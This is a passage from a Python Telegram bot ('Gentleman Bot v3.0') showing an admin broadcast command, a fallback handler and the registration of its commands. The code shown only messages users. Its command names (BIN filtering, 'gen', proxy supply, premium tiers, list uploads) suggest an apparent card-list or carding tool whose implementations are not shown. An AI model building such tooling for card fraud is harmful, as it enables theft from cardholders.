        await update.message.reply_text("◈ Usage: <code>/broadcast &lt;message&gt;</code>", parse_mode=ParseMode.HTML)
        return

    message_text = " ".join(context.args)

    await update.message.reply_text(f"⟳ Broadcast to all registered users…")

    success = 0
    failed = 0
    for uid in list(user_ids_cache):
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=f"✦ <b>Announcement</b>\n\n{message_text}",
                parse_mode=ParseMode.HTML,
            )
            success += 1
            await asyncio.sleep(0.1)
        except Exception:
            failed += 1

    await update.message.reply_text(
        f"✦ Broadcast Complete\n"
        f"  Delivered:  {success:,}\n"
        f"  Failed:     {failed:,}",
        parse_mode=ParseMode.HTML,
    )
    logger.info(f"Admin {update.effective_user.id} broadcast: {success} OK, {failed} fail")


# ═══════════════════════════════════════════════════════════════
#  FALLBACK
# ═══════════════════════════════════════════════════════════════

async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⊘ Unknown directive. Use /start or /help for guidance.")


# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════

def main() -> None:
    global premium_cache, ban_cache, user_ids_cache
    premium_cache = load_premium_data()
    ban_cache = load_ban_data()
    user_ids_cache = load_user_ids()
    logger.info(f"Loaded: {len(premium_cache)} premium | {len(ban_cache)} banned | {len(user_ids_cache)} users")

    app = Application.builder().token(BOT_TOKEN).build()

    # Basic
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))

    # Core (users)
    app.add_handler(CommandHandler("ft", cmd_ft))
    app.add_handler(CommandHandler("clean", cmd_clean))
    app.add_handler(CommandHandler("spl", cmd_spl))
    app.add_handler(CommandHandler("shuffle", cmd_shuffle))
    app.add_handler(CommandHandler("ftbin", cmd_ftbin))
    app.add_handler(CommandHandler("binstats", cmd_binstats))
    app.add_handler(CommandHandler("gen", cmd_gen))
    app.add_handler(CommandHandler("proxy", cmd_proxy))

    # Admin
    app.add_handler(CommandHandler("count", cmd_count))
    app.add_handler(CommandHandler("addpremium", cmd_add_premium))
    app.add_handler(CommandHandler("removepremium", cmd_remove_premium))
    app.add_handler(CommandHandler("premiumlist", cmd_premium_list))
    app.add_handler(CommandHandler("status", cmd_user_status))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))
    app.add_handler(CommandHandler("clear", cmd_clear))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))

    # File upload
    app.add_handler(MessageHandler(filters.Document.TXT, cmd_upload))

    # Fallback
    app.add_handler(MessageHandler(filters.COMMAND, unknown_command))

    logger.info("All handlers registered. Starting…")
    print("┌──────────────────────────────────┐")
    print("│    ✦  GENTLEMAN BOT  v3.0  ✦   │")
    print("│    Status:  Active              │")
    print("│    Ctrl+C to terminate          │")
    print("└──────────────────────────────────┘")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
